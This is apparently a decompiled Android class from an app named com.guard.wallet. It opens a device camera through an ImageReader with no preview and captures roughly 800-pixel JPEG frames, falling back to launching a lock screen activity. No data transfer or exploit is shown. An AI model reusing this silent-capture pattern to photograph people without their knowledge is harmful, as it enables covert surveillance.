package p010m;

import a1.AbstractC0026q;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.ImageReader;
import android.os.Handler;
import android.os.Looper;
import android.util.Size;
import com.guard.wallet.LockActivity;
import com.guard.wallet.MainApplication;
import com.guard.wallet.utils.AbstractC0251g;
import java.util.Objects;
import java.util.concurrent.atomic.AtomicBoolean;

/* renamed from: m.d */
/* loaded from: classes.dex */
public final class C0397d {

    /* renamed from: f */
    public static C0397d f796f = new C0397d();

    /* renamed from: a */
    public final AtomicBoolean f797a = new AtomicBoolean(false);

    /* renamed from: b */
    public ImageReader f798b;

    /* renamed from: c */
    public CameraDevice f799c;

    /* renamed from: d */
    public CameraCaptureSession f800d;

    /* renamed from: e */
    public C0396c f801e;

    /* renamed from: b */
    public static C0396c m962b(CameraManager cameraManager, int i2) {
        Size[] outputSizes;
        try {
            if (cameraManager.getCameraIdList().length > 0) {
                for (String str : cameraManager.getCameraIdList()) {
                    C0396c c0396c = new C0396c();
                    c0396c.f792a = str;
                    CameraCharacteristics cameraCharacteristics = cameraManager.getCameraCharacteristics(str);
                    Integer num = (Integer) cameraCharacteristics.get(CameraCharacteristics.SENSOR_ORIENTATION);
                    if (num != null) {
                        c0396c.f794c = num.intValue();
                    }
                    Integer num2 = (Integer) cameraCharacteristics.get(CameraCharacteristics.LENS_FACING);
                    StreamConfigurationMap streamConfigurationMap = (StreamConfigurationMap) cameraCharacteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
                    if (streamConfigurationMap != null && (outputSizes = streamConfigurationMap.getOutputSizes(256)) != null && outputSizes.length > 0) {
                        int length = outputSizes.length;
                        int i3 = Integer.MAX_VALUE;
                        Size size = null;
                        int i4 = 0;
                        while (true) {
                            if (i4 >= length) {
                                size = null;
                                break;
                            }
                            Size size2 = outputSizes[i4];
                            int abs = Math.abs(size2.getWidth() - 800);
                            if (abs > i3) {
                                break;
                            }
                            i4++;
                            size = size2;
                            i3 = abs;
                        }
                        if (size == null) {
                            size = outputSizes[outputSizes.length - 1];
                        }
                        c0396c.f795d = size;
                    }
                    if (num2 != null && num2.intValue() == i2) {
                        c0396c.f793b = num2.intValue();
                        return c0396c;
                    }
                }
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("m.d", e2);
        }
        return null;
    }

    /* renamed from: c */
    public static C0397d m963c() {
        if (f796f == null) {
            f796f = new C0397d();
        }
        return f796f;
    }

    /* renamed from: a */
    public final boolean m964a(int i2) {
        if (AbstractC0251g.m653Z() == null) {
            return false;
        }
        if (!AbstractC0251g.m664k()) {
            C0396c c0396c = new C0396c();
            this.f801e = c0396c;
            c0396c.f793b = i2;
            AtomicBoolean atomicBoolean = this.f797a;
            if (!atomicBoolean.get()) {
                atomicBoolean.set(true);
                if (LockActivity.m331b() == null) {
                    AbstractC0251g.d1(MainApplication.getInstance().getPackageName(), LockActivity.class.getName());
                } else {
                    LockActivity.m331b().m332c();
                }
            }
            return false;
        }
        CameraManager cameraManager = (CameraManager) AbstractC0251g.m653Z().getSystemService("camera");
        if (cameraManager != null) {
            try {
                C0396c m962b = m962b(cameraManager, i2);
                this.f801e = m962b;
                if (m962b != null && !AbstractC0026q.m151B(m962b.f792a)) {
                    Size size = this.f801e.f795d;
                    ImageReader newInstance = size != null ? ImageReader.newInstance(800, (int) ((Float.parseFloat(String.valueOf(size.getHeight())) / this.f801e.f795d.getWidth()) * 800.0f), 256, 2) : ImageReader.newInstance(800, 800, 256, 2);
                    this.f798b = newInstance;
                    newInstance.setOnImageAvailableListener(new C0399f(this.f801e.f793b), new Handler(Looper.getMainLooper()));
                    cameraManager.openCamera(this.f801e.f792a, new C0398e(this.f798b.getSurface()), new Handler(Looper.getMainLooper()));
                    return true;
                }
                return false;
            } catch (Exception e2) {
                AbstractC0026q.m186s("m.d", e2);
            }
        }
        return false;
    }

    /* renamed from: d */
    public final void m965d(int i2) {
        C0396c c0396c = this.f801e;
        if (!Objects.equals(Integer.valueOf(c0396c != null ? c0396c.f793b : -1), Integer.valueOf(i2)) || this.f799c == null) {
            return;
        }
        m966e();
    }

    /* renamed from: e */
    public final boolean m966e() {
        try {
            CameraCaptureSession cameraCaptureSession = this.f800d;
            if (cameraCaptureSession != null) {
                cameraCaptureSession.stopRepeating();
                this.f800d = null;
            }
            CameraDevice cameraDevice = this.f799c;
            if (cameraDevice != null) {
                cameraDevice.close();
                this.f799c = null;
            }
            ImageReader imageReader = this.f798b;
            if (imageReader != null) {
                imageReader.close();
                this.f798b = null;
            }
            this.f801e = null;
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("m.d", e2);
            return false;
        }
    }
}
